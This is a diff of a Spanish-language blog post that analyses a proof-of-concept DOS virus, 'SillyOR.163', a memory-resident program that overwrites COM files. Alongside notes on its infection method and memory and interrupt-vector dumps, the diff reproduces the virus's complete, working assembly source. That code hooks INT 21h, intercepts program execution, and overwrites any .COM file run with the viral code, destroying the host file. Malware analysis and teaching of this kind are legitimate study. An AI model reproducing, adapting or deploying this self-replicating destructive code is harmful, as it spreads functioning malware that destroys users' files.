@@ -17,7 +17,7 @@ El virus simplemente sobrescribe otros archivos COM con el código viral. Es la 
 más primitiva, pero es muy agresiva y destructiva. Todas las generaciones del 
 virus son idénticas.
 
-![infection](/assets/images/poc-virus-x86dos-com-overwriting-resident-tsr/infection.png){:width="350"}
+{% img infection.png | {"width":"350"} %}
 
 Generalmente nada se preserva de los archivos huéspedes ya que son destruidos por la sobrescritura. 
 La desinfección consiste en eliminar todos los archivos infectados.
@@ -28,8 +28,7 @@ como un programa TSR (Terminate and Stay Resident) normal mediante el servicio 2
 por DOS. Durante la infección, el virus reconoce si ya se encuentra residente mediante un
 servicio propio en la interrupción 21h.
 
-![memory](/assets/images/poc-virus-x86dos-com-overwriting-resident-tsr/memory.png){:width="450"}
-
+{% img memory.png | {"width":"450"} %}
 
 ## Método de propagación
 El virus modifica el handler original de la interrupción 21h cambiando el vector del handler en 
@@ -41,11 +40,12 @@ Esto tiene dos objetivos:
 
 ## Flujo de ejecución
 Al ejecutarse un archivo infectado, el virus se hace residente en memoria y modifica la IVT:
-![flow 1](/assets/images/poc-virus-x86dos-com-overwriting-resident-tsr/flow1.png){:width="280"}
+
+{% img flow1.png | {"width":"280"} %}
 
 Cuando el virus ya es residente en memoria, intercepta todas las llamadas a la interrupción 21h:
 
-![flow 2](/assets/images/poc-virus-x86dos-com-overwriting-resident-tsr/flow2.png){:width="400"}
+{% img flow2.png | {"width":"400"} %}
 
 ## Análisis estático
 Hex dump de un archivo sano de tamaño 80 bytes:
@@ -105,7 +105,7 @@ Microsoft Virtual PC 6.0 con VM Additions.
 **Antes de la infección**  
 Resultado de `MEM /C`:
 
-<pre class="ovf">Name           Total       =   Conventional   +   Upper Memory
+<pre>Name           Total       =   Conventional   +   Upper Memory
   --------  ----------------   ----------------   ----------------
   MSDOS       16,157   (16K)     16,157   (16K)          0    (0K)
   SETVER         480    (0K)        480    (0K)          0    (0K)
@@ -170,7 +170,7 @@ es fácil de detectar. Ocupa 608 bytes de espacio en memoria convencional.
 
 Resultado de `MEM /M VTEST`:
 
-<pre class="ovf">Segment  Region       Total        Type
+<pre>Segment  Region       Total        Type
   -------  ------  ----------------  --------
    0218A                160    (0K)  Environment
    02194                448    (0K)  Program
@@ -199,7 +199,7 @@ forma de 4 bytes segmento:offset, este se encuentra en el offset 84h de la IVT.
 **Antes de la infección**  
 Hex dump de los 4 bytes del vector 21h:
 
-<pre class="ovf">-D 0000:0084 L4                                  
+<pre>-D 0000:0084 L4                                  
 0000:0080              E1 20 04 11
 </pre>
 
@@ -208,7 +208,7 @@ El handler original de 21h se encuentra en 1104:20E1.
 **Después de la infección**  
 Hex dump de los 4 bytes del vector 21h:
 
-<pre class="overf">-D 0000:0084 L4
+<pre>-D 0000:0084 L4
 0000:0080              2A 01 95 21
 </pre>
 
@@ -216,7 +216,7 @@ El vector ya no es el mismo.
 
 Desensamblado del handler referenciado por el nuevo vector:
 
-<pre class="ovf">-U 2195:012A
+<pre>-U 2195:012A
 2195:012A 3DCDAB       CMP      AX,ABCD      ; inicio del handler viral
 2195:012D 740A         JZ0139                   
 2195:012F 3D004B       CMP      AX,4B00                            
@@ -322,7 +322,7 @@ Se utiliza la interrupción 27h (DOS 1.x) para crear programas TSR.
 
 ## Código fuente
 {% highlight nasm linenos %}
-;###############################################################################  
+;##############################################################################  
 ;# Nombre:        virus://DOS/SillyOR.163  
 ;# Plataforma:    Intel x86  
 ;# SO:            DOS v2.0+  
@@ -337,122 +337,132 @@ Se utiliza la interrupción 27h (DOS 1.x) para crear programas TSR.
 ;# Stealth:       No  
 ;# Payload:       No  
 ;##############################################################################
-                    .8086  
-                    .model tiny
 
-                    assume cs:virus, ds:virus
+.8086  
+.model tiny
 
-          virus     segment byte public 'CODE'
+assume cs:virus, ds:virus
 
-                    org 100h
+virus segment byte public 'CODE'
 
-         start:     mov ax, 0ABCDh                    ; | AX = 0ABCDh  
-                    int 21h                           ; |_DOS API - Llamar servicio de reconocimiento del virus
+    org 100h
+
+start:     
+    mov ax, 0ABCDh                    ; | AX = 0ABCDh  
+    int 21h                           ; |_DOS API - Llamar servicio de reconocimiento del virus
                     
-                    cmp ax, 029Ah                     ; verificar código de respuesta  
-                    jne infect_int21h                 ; si no es 666 (29Ah), infectar INT 21h
+    cmp ax, 029Ah                     ; verificar código de respuesta  
+    jne infect_int21h                 ; si no es 666 (29Ah), infectar INT 21h
                     
-                    mov ah, 00h                       ; | AH = 00h  
-                    int 21h                           ; |_DOS API - Retornar a DOS 
+    mov ah, 00h                       ; | AH = 00h  
+    int 21h                           ; |_DOS API - Retornar a DOS 
 
- infect_int21h:     mov ah, 35h                       ; | AH = 35h  
-                    mov al, 21h                       ; | AL = número de interrupción, 21h  
-                    int 21h                           ; |_DOS API - Obtener vector en ES:BX
+infect_int21h:     
+    mov ah, 35h                       ; | AH = 35h  
+    mov al, 21h                       ; | AL = número de interrupción, 21h  
+    int 21h                           ; |_DOS API - Obtener vector en ES:BX
                     
-                    mov [vector_int21], bx            ; guardar vector original de INT 21h  
-                    mov [vector_int21 + 2], es
+    mov [vector_int21], bx            ; guardar vector original de INT 21h  
+    mov [vector_int21 + 2], es
                     
-                    mov ah, 25h                       ; | AH = 25h  
-                    mov al, 21h                       ; | AL = número de interrupción, 21h  
-                    mov dx, offset handler_int21h     ; | DS:DX -> dirección del nuevo handler: handler_int21h  
-                    int 21h                           ; |_DOS API - Cambiar vector
-                    
-                                                      ; | CS = segmento de PSP  
-                    mov dx, offset eof                ; | DX = Tamaño de porción residente (bytes)  
-                    int 27h                           ; |_DOS API - Termina el programa y lo deja en memoria 
+    mov ah, 25h                       ; | AH = 25h  
+    mov al, 21h                       ; | AL = número de interrupción, 21h  
+    mov dx, offset handler_int21h     ; | DS:DX -> dirección del nuevo handler: handler_int21h  
+    int 21h                           ; |_DOS API - Cambiar vector
+    
+                                      ; | CS = segmento de PSP  
+    mov dx, offset eof                ; | DX = Tamaño de porción residente (bytes)  
+    int 27h                           ; |_DOS API - Termina el programa y lo deja en memoria 
 
-handler_int21h:     cmp ax, 0ABCDh                    ; llamada de verificación del virus:  
-                    je service_ABCD                   ; responder y retornar  
-                    cmp ax, 4B00h                     ; llamada para ejecutar archivo:  
-                    je infect_file                    ; infectar y delegar  
-                    jmp dword ptr cs:[vector_int21]   ; en otro caso, delegar al handler original de INT 21h 
+handler_int21h:     
+    cmp ax, 0ABCDh                    ; llamada de verificación del virus:  
+    je service_ABCD                   ; responder y retornar  
+    cmp ax, 4B00h                     ; llamada para ejecutar archivo:  
+    je infect_file                    ; infectar y delegar  
+    jmp dword ptr cs:[vector_int21]   ; en otro caso, delegar al handler original de INT 21h 
 
-  service_ABCD:     mov ax, 029Ah                     ; código de respuesta: 666 (29Ah)  
-                    iret                              ; retornar de la interrupción
+service_ABCD:     
+    mov ax, 029Ah                     ; código de respuesta: 666 (29Ah)  
+    iret                              ; retornar de la interrupción
 
-   infect_file:     pushf  
-                    call dword ptr cs:[vector_int21]  ; simular INT 21h para ejecutar archivo
+infect_file:    
+    pushf  
+    call dword ptr cs:[vector_int21]  ; simular INT 21h para ejecutar archivo
 
-                    pushf  
-                    pop cs:[ret_EFLAGS]
-                    
-                    push ax                           ; guardar registros que serán utilizados  
-                    push bx  
-                    push cx  
-                    push dx  
-                    push si  
-                    push ds  
-                                                      ; por la llamada AX=4B00h, DS:DX apunta al nombre del archivo  
-                    mov si, dx                        ; verificar que sea extensión ".COM"  
-      loop_str:     lodsb  
-                    or al, al  
-                    jz close_file  
-                    cmp al, '.';  
-                    jne loop_str  
-                    lodsb  
-                    cmp al, 'C';  
-                    jne close_file  
-                    lodsb  
-                    cmp al, 'O';  
-                    jne close_file  
-                    lodsb  
-                    cmp al, 'M'  
-                    jne close_file 
-                    
-                    mov ah, 3Dh                       ; | AH = 3Dh  
-                    mov al, 2                         ; | AL = 2, lectura y escritura  
-                    int 21h                           ; |_DOS API - Abrir archivo existente 
-                    
-                    jc exit                           ; si no se puede abrir archivo, restaurar y delegar  
-                    xchg ax, bx                       ; handle de archivo en BX
-                    
-                    push cs  
-                    pop ds                            ; MOV DS, CS
-                    
-                    mov ah, 40h                       ; | AH = 40h  
-                    mov cx, virus_size                ; | CX = tamaño del virus  
-                    mov dx, offset start              ; | DS:DX -> origen: inicio del código viral  
-                    int 21h                           ; |_DOS API - Escribir en archivo/dispositivo
+    pushf  
+    pop cs:[ret_EFLAGS]
+    
+    push ax                           ; guardar registros que serán utilizados  
+    push bx  
+    push cx  
+    push dx  
+    push si  
+    push ds  
+                                      ; por la llamada AX=4B00h, DS:DX apunta al nombre del archivo  
+    mov si, dx                        ; verificar que sea extensión ".COM"  
+    
+loop_str:     
+    lodsb  
+    or al, al  
+    jz close_file  
+    cmp al, '.';  
+    jne loop_str  
+    lodsb  
+    cmp al, 'C';  
+    jne close_file  
+    lodsb  
+    cmp al, 'O';  
+    jne close_file  
+    lodsb  
+    cmp al, 'M'  
+    jne close_file 
+    
+    mov ah, 3Dh                       ; | AH = 3Dh  
+    mov al, 2                         ; | AL = 2, lectura y escritura  
+    int 21h                           ; |_DOS API - Abrir archivo existente 
+    
+    jc exit                           ; si no se puede abrir archivo, restaurar y delegar  
+    xchg ax, bx                       ; handle de archivo en BX
+    
+    push cs  
+    pop ds                            ; MOV DS, CS
+    
+    mov ah, 40h                       ; | AH = 40h  
+    mov cx, VIRUS_SIZE                ; | CX = tamaño del virus  
+    mov dx, offset start              ; | DS:DX -> origen: inicio del código viral  
+    int 21h                           ; |_DOS API - Escribir en archivo/dispositivo
 
-    close_file:     mov ah, 3Eh                       ; | AH = 3Eh  
-                    int 21h                           ; |_DOS API - Cerrar archivo 
+close_file:     
+    mov ah, 3Eh                       ; | AH = 3Eh  
+    int 21h                           ; |_DOS API - Cerrar archivo 
 
-          exit:     pop ds                            ; restaurar registros  
-                    pop si  
-                    pop dx  
-                    pop cx  
-                    pop bx  
-                    pop ax 
-                    
-                    pop cs:[ret_IP]  
-                    pop cs:[ret_CS]  
-                    popf
-                    
-                    push cs:[ret_EFLAGS]  
-                    push cs:[ret_CS]  
-                    push cs:[ret_IP]  
-                    iret
+exit:     
+    pop ds                            ; restaurar registros  
+    pop si  
+    pop dx  
+    pop cx  
+    pop bx  
+    pop ax 
+    
+    pop cs:[ret_IP]  
+    pop cs:[ret_CS]  
+    popf
+    
+    push cs:[ret_EFLAGS]  
+    push cs:[ret_CS]  
+    push cs:[ret_IP]  
+    iret
 
-      virus_size    equ ($ - start)                   ; tamaño del virus  
-    vector_int21    dw ?, ?                           ; vector original de INT 21h (4 bytes)  
-      ret_EFLAGS    dw ?                              ; registro de estado del CPU  
-          ret_IP    dw ?                              ; puntero a la instrucción de retorno  
-          ret_CS    dw ?                              ; segmento de código de retorno 
+VIRUS_SIZE      equ  ($ - start)      ; tamaño del virus  
+vector_int21    dw   ?, ?             ; vector original de INT 21h (4 bytes)  
+ret_EFLAGS      dw   ?                ; registro de estado del CPU  
+ret_IP          dw   ?                ; puntero a la instrucción de retorno  
+ret_CS          dw   ?                ; segmento de código de retorno 
 
-            eof:                                      ; fin de porción residente para TSR
+eof:                                  ; fin de porción residente para TSR
 
-           virus    ends  
-             end    start  
+virus ends  
+end start  
 {% endhighlight %}
 
 ## Bibliografía
